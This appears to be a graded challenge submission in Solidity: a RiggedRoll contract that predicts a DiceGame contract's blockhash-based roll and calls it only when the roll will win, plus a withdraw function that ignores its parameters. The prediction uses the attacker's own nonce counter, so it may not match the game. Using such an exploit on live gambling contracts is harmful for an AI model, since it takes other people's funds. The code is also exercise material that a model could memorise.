pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    uint256 public nonce = 0;

    event Roll(address indexed player, uint256 roll);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        _amount = address(this).balance;
        _addr = msg.sender;
        (bool success,) = payable(_addr).call{value: _amount}("");
        require(success, "withdraw failed!");
    }


    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
        uint256 roll = uint256(hash) % 16;

        console.log('\t',"   Dice Game Roll:",roll);

        nonce++;

        emit Roll(msg.sender, roll);

        if (roll <= 2 ) {
            require(address(this).balance >= .002 ether, "Contract balance not enough");
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            revert ("roll to be greater than 2");
        }


    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
}
